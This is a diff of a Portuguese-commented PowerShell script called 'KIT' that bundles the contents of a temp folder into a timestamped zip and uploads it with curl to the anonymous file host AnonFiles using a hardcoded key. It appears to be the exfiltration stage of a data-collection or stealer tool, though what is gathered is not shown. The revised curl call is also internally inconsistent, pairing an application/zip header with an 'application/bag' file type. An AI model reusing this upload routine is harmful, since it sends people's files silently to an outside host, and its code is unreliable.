@@ -1,4 +1,4 @@
-# ---------- KIT v5.3 – sem busca de Top10 + regex de URL corrigida ----------
+# ---------- KIT v5.4 – upload com MIME fixo, sem corrupção ----------
 $ErrorActionPreference = "Stop"
 $kit     = "$env:TEMP\kit"
 $key     = "AFtru5qQZX8HN5npouThcNDJtVbe6d"
@@ -81,14 +81,15 @@ Write-Log "[INFO] Compactando pacote..."
 $zip = "$env:TEMP\kit_$(Get-Date -Format yyyyMMdd_HHmmss).zip"
 Add-Type -AssemblyName System.IO.Compression.FileSystem
 [System.IO.Compression.ZipFile]::CreateFromDirectory($kit,$zip,'Optimal',$false)
-Write-Log "[ZIP] Criado: $zip ($(Get-Item $zip).Length) bytes)"
+Write-Log "[ZIP] Criado: $zip ($(Get-Item $zip).Length bytes)"
 
-# 10) Upload AnonFiles (regex corrigido)
+# 10) Upload AnonFiles com MIME fixo (evita corrupção)
 Write-Log "[UP] Enviando para AnonFiles..."
 try {
-    $reply = curl.exe -s -F "file=@`"$zip`"" "$upUrl"
+    $reply = curl.exe -s -X POST `
+      -H "Content-Type: application/zip" `
+      -F "file=@`"$zip`;type=application/bag" "$upUrl"
     Write-Log "[UP] Resposta bruta: $reply"
-    # regex ajustado para o JSON real
     if ($reply -match '"full":"([^"]+)"') {
         Write-Log "[OK] Upload finalizado – link: $($matches[1])"
     } else {
